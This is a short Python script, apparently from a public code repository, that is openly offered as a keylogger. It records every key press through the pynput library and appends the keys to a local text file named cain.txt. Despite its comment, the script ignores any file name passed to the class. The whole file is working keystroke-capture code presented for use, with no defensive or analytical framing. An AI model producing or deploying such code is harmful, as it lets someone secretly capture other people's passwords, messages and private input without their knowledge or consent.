#!/usr/bin/env python3

'''
SImple keylogger script that outputs the results into a text file of the local directory.

:)

Author: Nicholas Sepe

License: Github The Unlicense
'''

#twist of cain /var/log
from pynput.keyboard import Key, Listener
class Cain:
    # creates cain.txt if not given a file name
        # ex.) Cain("log.txt") will log keystrokes to log.txt in the local dir
    def __init__(self, file="cain.txt"):
        self.file = file

    def on_press(self, key):
        # change "a" to "w" if you want to overwrite previous file
        with open("cain.txt", "a") as file:
            file.write(f"{key}")
    def on_release(self, key):
        pass

    def listen(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":
    c = Cain()
    c.listen()
